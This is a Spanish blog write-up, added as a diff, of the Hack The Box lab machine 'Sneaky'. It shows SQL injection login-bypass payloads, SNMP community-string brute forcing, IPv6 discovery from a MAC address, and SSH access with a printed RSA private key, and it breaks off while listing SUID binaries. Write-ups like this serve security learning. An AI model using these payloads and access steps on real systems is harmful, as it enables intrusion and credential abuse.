@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada Sneaky de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada Sneaky de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SNEAKY" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SNEAKY" />
+<link rel="canonical" href="http://localhost:4000/2021/05/26/Sneaky-HTB-BufferOverFlow.html" />
+<meta property="og:url" content="http://localhost:4000/2021/05/26/Sneaky-HTB-BufferOverFlow.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-26T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada Sneaky de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-05-26T00:00:00-03:00","datePublished":"2021-05-26T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SNEAKY","headline":"Maquina Retirada Sneaky de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/05/26/Sneaky-HTB-BufferOverFlow.html"},"url":"http://localhost:4000/2021/05/26/Sneaky-HTB-BufferOverFlow.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina  Retirada Sneaky de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/IPV6,/">IPV6,</a>
+      
+      <a class="tag" href="/tag/SNMP,/">SNMP,</a>
+      
+      <a class="tag" href="/tag/SQLInjecction,/">SQLInjecction,</a>
+      
+      <a class="tag" href="/tag/Web/">Web</a>
+      
+      <a class="tag" href="/tag/Hacking,/">Hacking,</a>
+      
+      <a class="tag" href="/tag/BOF,/">BOF,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup/">Writeup</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 26 May 2021</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SNEAKY</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="sneaky--hack-the-box">Sneaky ~ Hack The Box</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS -T5 -v -n -Pn -oG allports 10.10.10.20       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Under Development!
+</code></pre></div></div>
+<p>Efectuamos un reconocimiento con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> en el puerto <code class="language-plaintext highlighter-rouge">HTTP</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wtw 10.10.10.20                                                                                                            </span>
+http://10.10.10.20 <span class="o">[</span>200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.20], Title[Under Development!]
+</code></pre></div></div>
+<p>Haciendo FUZZING web:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#" wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.10.20/FUZZ    " </span>
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                   
+<span class="o">=====================================================================</span>
+                                                                                 
+000000810:   200        14 L     32 W       464 Ch      <span class="s2">"dev"</span>  
+</code></pre></div></div>
+<p>Encontramos un directorio, procedemos a hecharle un vistazo visual a la ruta y a la web:
+vemos que es un Loguin super Cutre
+Probamos con Injecciones sql Basicas</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="k">admin</span><span class="s1">' or 1=1-- -
+# admin'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="c1">-- -  	&gt;&gt;&gt; Nos devuelve un user</span>
+
+			<span class="nv">"	name: admin             "</span>
+			<span class="nv">" 	name: thrasivoulos        "</span>
+</code></pre></div></div>
+<p>Y una <code class="language-plaintext highlighter-rouge">Clave Id_rsa</code> (clave privada)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
+Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
+3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
+yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
+cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
+oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
+Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
+h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
+CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
+OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
+I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
+JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
+5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
+ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
++jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
+7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
+GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
+aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
+VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
+hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
+1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
+LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
+UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
+Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
+rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+<p>Como tenemos una clave SSH y el puerto 22 no nos aparece abierto (x reglas de firewall o iptables) para IPV4.
+Pensamos que si conseguimos la direccion macc de la maquina podremos probar via IPV6 realizando el escaneo atraves de la macc para ipv6.</p>
+
+<p>Vamos a hacer uso de herramientas como <code class="language-plaintext highlighter-rouge">SNMPWALK</code> 
+Para ello vamos a enumerar un SERVICIO <code class="language-plaintext highlighter-rouge">UDP</code> llamado <code class="language-plaintext highlighter-rouge">SNMP</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap -p161 -sU --open -T5 -vvv -n -Pn 10.10.10.20           </span>
+PORT    STATE         SERVICE REASON
+161/udp open|filtered snmp    no-response
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.62 seconds
+           Raw packets sent: 2 <span class="o">(</span>149B<span class="o">)</span> | Rcvd: 0 <span class="o">(</span>0B<span class="o">)</span>
+</code></pre></div></div>
+<p>Como vemos no nos reporta que este abierto correctamienta asique vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">Onesixtyone</code> para hacer fuerza bruta a este servicio y encontrar
+la Community-String
+Vale pues buscando un Diccionario para averiguar la community Strings del servicio SNMP necesitamos hacer uso de otra herramienta que se llama ONESIXTYONE</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># onesixtyone -c common-snmp-community-strings-onesixtyone.txt 10.10.10.20 </span>
+Scanning 1 hosts, 121 communities
+10.10.10.20 <span class="o">[</span>public] Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
+10.10.10.20 <span class="o">[</span>public] Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
+</code></pre></div></div>
+<p>Ahi la tenemos: <code class="language-plaintext highlighter-rouge">Linux Sneaky 4.4.0-75-generic</code></p>
+
+<p>Ahora procedemos a con la herramienta SNMPWALK</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># snmpwalk -v2c -c public 10.10.10.20</span>
+iso.3.6.1.2.1.1.1.0 <span class="o">=</span> STRING: <span class="s2">"Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686"</span>
+iso.3.6.1.2.1.1.2.0 <span class="o">=</span> OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 <span class="o">=</span> Timeticks: <span class="o">(</span>351310<span class="o">)</span> 0:58:33.10
+iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"root"</span>
+iso.3.6.1.2.1.1.5.0 <span class="o">=</span> STRING: <span class="s2">"Sneaky"</span>
+iso.3.6.1.2.1.1.6.0 <span class="o">=</span> STRING: <span class="s2">"Unknown"</span>
+iso.3.6.1.2.1.1.8.0 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+iso.3.6.1.2.1.1.9.1.2.1 <span class="o">=</span> OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 <span class="o">=</span> OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.3 <span class="o">=</span> OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.4 <span class="o">=</span> OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 <span class="o">=</span> OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.6 <span class="o">=</span> OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.7 <span class="o">=</span> OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 <span class="o">=</span> OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.9 <span class="o">=</span> OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 <span class="o">=</span> OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 <span class="o">=</span> STRING: <span class="s2">"The MIB for Message Processing and Dispatching."</span>
+iso.3.6.1.2.1.1.9.1.3.2 <span class="o">=</span> STRING: <span class="s2">"The management information definitions for the SNMP User-based Security Model."</span>
+iso.3.6.1.2.1.1.9.1.3.3 <span class="o">=</span> STRING: <span class="s2">"The SNMP Management Architecture MIB."</span>
+iso.3.6.1.2.1.1.9.1.3.4 <span class="o">=</span> STRING: <span class="s2">"The MIB module for SNMPv2 entities"</span>
+iso.3.6.1.2.1.1.9.1.3.5 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing TCP implementations"</span>
+iso.3.6.1.2.1.1.9.1.3.6 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing IP and ICMP implementations"</span>
+iso.3.6.1.2.1.1.9.1.3.7 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing UDP implementations"</span>
+iso.3.6.1.2.1.1.9.1.3.8 <span class="o">=</span> STRING: <span class="s2">"View-based Access Control Model for SNMP."</span>
+iso.3.6.1.2.1.1.9.1.3.9 <span class="o">=</span> STRING: <span class="s2">"The MIB modules for managing SNMP Notification, plus filtering."</span>
+iso.3.6.1.2.1.1.9.1.3.10 <span class="o">=</span> STRING: <span class="s2">"The MIB module for logging SNMP Notifications."</span>
+iso.3.6.1.2.1.1.9.1.4.1 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.2 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.3 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.4 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.5 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.6 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.7 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.8 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.9 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.10 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+</code></pre></div></div>
+<p>Esto como vemos nos va a listar un monton de informacion! 
+Y a nosotros nos interesa ver si podemos ver informacion de las INTERFACES 	para ver si podemos conseguir la MAC ADDRESS
+Aparte para ello vamos a instalar una utilidad nueva para que nos traduzca el output de <code class="language-plaintext highlighter-rouge">SNMPWALK</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Instalandolo <span class="c"># apt install snmp-mibs-downloader -y </span>
+</code></pre></div></div>
+<p>Ahora volvemos a usar <code class="language-plaintext highlighter-rouge">SNMPWALK</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># snmpwalk -v2c -c public 10.10.10.20</span>
+SNMPv2-MIB::sysDescr.0 <span class="o">=</span> STRING: Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
+SNMPv2-MIB::sysObjectID.0 <span class="o">=</span> OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+DISMAN-EVENT-MIB::sysUpTimeInstance <span class="o">=</span> Timeticks: <span class="o">(</span>363286<span class="o">)</span> 1:00:32.86
+SNMPv2-MIB::sysContact.0 <span class="o">=</span> STRING: root
+SNMPv2-MIB::sysName.0 <span class="o">=</span> STRING: Sneaky
+SNMPv2-MIB::sysLocation.0 <span class="o">=</span> STRING: Unknown
+SNMPv2-MIB::sysORLastChange.0 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+SNMPv2-MIB::sysORID.1 <span class="o">=</span> OID: SNMP-MPD-MIB::snmpMPDCompliance
+SNMPv2-MIB::sysORID.2 <span class="o">=</span> OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+SNMPv2-MIB::sysORID.3 <span class="o">=</span> OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+SNMPv2-MIB::sysORID.4 <span class="o">=</span> OID: SNMPv2-MIB::snmpMIB
+SNMPv2-MIB::sysORID.5 <span class="o">=</span> OID: TCP-MIB::tcpMIB
+SNMPv2-MIB::sysORID.6 <span class="o">=</span> OID: IP-MIB::ip
+SNMPv2-MIB::sysORID.7 <span class="o">=</span> OID: UDP-MIB::udpMIB
+SNMPv2-MIB::sysORID.8 <span class="o">=</span> OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
+SNMPv2-MIB::sysORID.9 <span class="o">=</span> OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
+SNMPv2-MIB::sysORID.10 <span class="o">=</span> OID: NOTIFICATION-LOG-MIB::notificationLogMIB
+SNMPv2-MIB::sysORDescr.1 <span class="o">=</span> STRING: The MIB <span class="k">for </span>Message Processing and Dispatching.
+SNMPv2-MIB::sysORDescr.2 <span class="o">=</span> STRING: The management information definitions <span class="k">for </span>the SNMP User-based Security Model.
+SNMPv2-MIB::sysORDescr.3 <span class="o">=</span> STRING: The SNMP Management Architecture MIB.
+SNMPv2-MIB::sysORDescr.4 <span class="o">=</span> STRING: The MIB module <span class="k">for </span>SNMPv2 entities
+SNMPv2-MIB::sysORDescr.5 <span class="o">=</span> STRING: The MIB module <span class="k">for </span>managing TCP implementations
+SNMPv2-MIB::sysORDescr.6 <span class="o">=</span> STRING: The MIB module <span class="k">for </span>managing IP and ICMP implementations
+SNMPv2-MIB::sysORDescr.7 <span class="o">=</span> STRING: The MIB module <span class="k">for </span>managing UDP implementations
+SNMPv2-MIB::sysORDescr.8 <span class="o">=</span> STRING: View-based Access Control Model <span class="k">for </span>SNMP.
+SNMPv2-MIB::sysORDescr.9 <span class="o">=</span> STRING: The MIB modules <span class="k">for </span>managing SNMP Notification, plus filtering.
+SNMPv2-MIB::sysORDescr.10 <span class="o">=</span> STRING: The MIB module <span class="k">for </span>logging SNMP Notifications.
+SNMPv2-MIB::sysORUpTime.1 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+SNMPv2-MIB::sysORUpTime.2 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+SNMPv2-MIB::sysORUpTime.3 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+SNMPv2-MIB::sysORUpTime.4 <span class="o">=</span> Timeticks: <span class="o">(</span>0<span class="o">)</span> 0:00:00.00
+SNMPv2-MIB::sysORUpTime.5 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+SNMPv2-MIB::sysORUpTime.6 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+SNMPv2-MIB::sysORUpTime.7 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+SNMPv2-MIB::sysORUpTime.8 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+SNMPv2-MIB::sysORUpTime.9 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+SNMPv2-MIB::sysORUpTime.10 <span class="o">=</span> Timeticks: <span class="o">(</span>1<span class="o">)</span> 0:00:00.01
+IF-MIB::ifNumber.0 <span class="o">=</span> INTEGER: 2
+IF-MIB::ifIndex.1 <span class="o">=</span> INTEGER: 1
+</code></pre></div></div>
+<p>Otra Forma de sacar la MAC address:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># locate .nse |  grep snmp                                                                                                                         130 ⨯</span>
+/usr/share/nmap/scripts/snmp-brute.nse
+/usr/share/nmap/scripts/snmp-hh3c-logins.nse
+/usr/share/nmap/scripts/snmp-info.nse
+/usr/share/nmap/scripts/snmp-interfaces.nse					ESTE SERIA EL BUENO, vamos a usarlo
+/usr/share/nmap/scripts/snmp-ios-config.nse
+/usr/share/nmap/scripts/snmp-netstat.nse
+/usr/share/nmap/scripts/snmp-processes.nse
+/usr/share/nmap/scripts/snmp-sysdescr.nse
+/usr/share/nmap/scripts/snmp-win32-services.nse
+/usr/share/nmap/scripts/snmp-win32-shares.nse
+/usr/share/nmap/scripts/snmp-win32-software.nse
+/usr/share/nmap/scripts/snmp-win32-users.nse
+</code></pre></div></div>
+<p>Aqui procedemos a usar el script de <code class="language-plaintext highlighter-rouge">NMAP</code> <code class="language-plaintext highlighter-rouge">snmp-interfaces.nse</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap --script snmp-interfaces.nse -p161 -sU -vvv -n 10.10.10.20 -oN t-SNMPInterfaces</span>
+
+PORT    STATE SERVICE REASON
+161/udp open  snmp    script-set
+| snmp-interfaces: 
+|   lo
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 10 Mbps
+|     Status: up
+|     Traffic stats: 8.93 Kb sent, 8.93 Kb received
+|   eth0
+|     IP address: 10.10.10.20  Netmask: 255.255.255.0
+|     MAC address: 00:50:56:b9:04:bd <span class="o">(</span>VMware<span class="o">)</span>						Aqui tenemos la MAC Adress
+|     Type: ethernetCsmacd  Speed: 4 Gbps
+|     Status: up
+|_    Traffic stats: 8.07 Mb sent, 5.97 Mb received
+</code></pre></div></div>
+<p>Atraves de La Dirrecion MAC nosotros podemos:</p>
+<ul>
+  <li>Computar la Unique Local Address</li>
+  <li>Como?</li>
+</ul>
+
+<p>Paso 1.- <code class="language-plaintext highlighter-rouge"># dead:beef : : 00:50:56:b9:04:bd </code>
+Paso 2.- <code class="language-plaintext highlighter-rouge"># dead:beef : : 02:50:56ff:feb9:04:bd y faltaria dividirlo en pares de 4</code>
+Paso 3 .- <code class="language-plaintext highlighter-rouge"># dead:beef::0250:56ff:feb9:04bd cuando tiene un 0 al principio se puede omitir</code>
+Paso final 4.- <code class="language-plaintext highlighter-rouge"># dead:beef::250:56ff:feb9:04bd Esta seria la Unique Local Adress</code></p>
+
+<p>Y si probamos a enviarle una traza icmp por IPV6 vemos que nos responde correctamente.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ping -c 10 dead:beef::250:56ff:feb9:04bd                                                                                                           2 ⨯</span>
+PING dead:beef::250:56ff:feb9:04bd<span class="o">(</span>dead:beef::250:56ff:feb9:4bd<span class="o">)</span> 56 data bytes
+64 bytes from dead:beef::250:56ff:feb9:4bd: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>77.8 ms
+64 bytes from dead:beef::250:56ff:feb9:4bd: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>39.5 ms
+64 bytes from dead:beef::250:56ff:feb9:4bd: <span class="nv">icmp_seq</span><span class="o">=</span>3 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>39.7 ms
+64 bytes from dead:beef::250:56ff:feb9:4bd: <span class="nv">icmp_seq</span><span class="o">=</span>4 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>39.5 ms
+^C
+<span class="nt">---</span> dead:beef::250:56ff:feb9:04bd ping statistics <span class="nt">---</span>
+4 packets transmitted, 4 received, 0% packet loss, <span class="nb">time </span>3010ms
+rtt min/avg/max/mdev <span class="o">=</span> 39.503/49.144/77.808/16.548 ms
+</code></pre></div></div>
+<p>Ahora con Nmap podriamos volver a hacer el escaneo del principio pero en este caso jugando con el parameto -6 para indicarle que es un escaneo via IPV6</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn dead:beef::250:56ff:feb9:04bd -6 -oG allportsIPV6</span>
+
+Scanning dead:beef::250:56ff:feb9:4bd <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on dead:beef::250:56ff:feb9:4bd
+Discovered open port 22/tcp on dead:beef::250:56ff:feb9:4bd
+Completed SYN Stealth Scan at 12:02, 12.34s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>dead:beef::250:56ff:feb9:4bd
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+</code></pre></div></div>
+<p>Por lo que el siguiente paso ya seria establecer la conexion via <code class="language-plaintext highlighter-rouge">SSH</code> por <code class="language-plaintext highlighter-rouge">IPV6</code></p>
+
+<h1 id="accediendo-a-la-maquina-via-macunique-local-address-por-ssh-en-ipv6">Accediendo a la Maquina via MAC(Unique Local Address) por SSH en IPV6</h1>
+<p>Atraves de SSH por ipv6 con el user encontrado via injeccion sql en el loguin web y la Unique Local Adress computada atraves de la Mac obtenida con el script 
+de nmap snmp-interfaces.nse</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ssh -i id_rsa thrasivoulos@dead:beef::250:56ff:feb9:4bd </span>
+The authenticity of host <span class="s1">'dead:beef::250:56ff:feb9:4bd (dead:beef::250:56ff:feb9:4bd)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>dead:beef::250:56ff:feb9:4bd<span class="s1">' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed May 26 11:25:33 EEST 2021
+
+  System load: 0.0               Memory usage: 4%   Processes:       176
+  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Your Hardware Enablement Stack (HWE) is supported until April 2019.
+Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
+thrasivoulos@Sneaky:~$ 
+</span></code></pre></div></div>
+<p>Aqui conseguimos acceso correctamente, y el siguiente paso es leer la flag <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:~<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+thrasivoulos@Sneaky:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+9fe14f76222db23a770f201xxxxxxxxxx
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios-via-bufferoverflow-gracias-a-un-binario-suid">Escalada de privilegios via BufferOverFlow gracias a un binario SUID</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thrasivoulos@Sneaky:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ping6
+/bin/fusermount
+/bin/ping
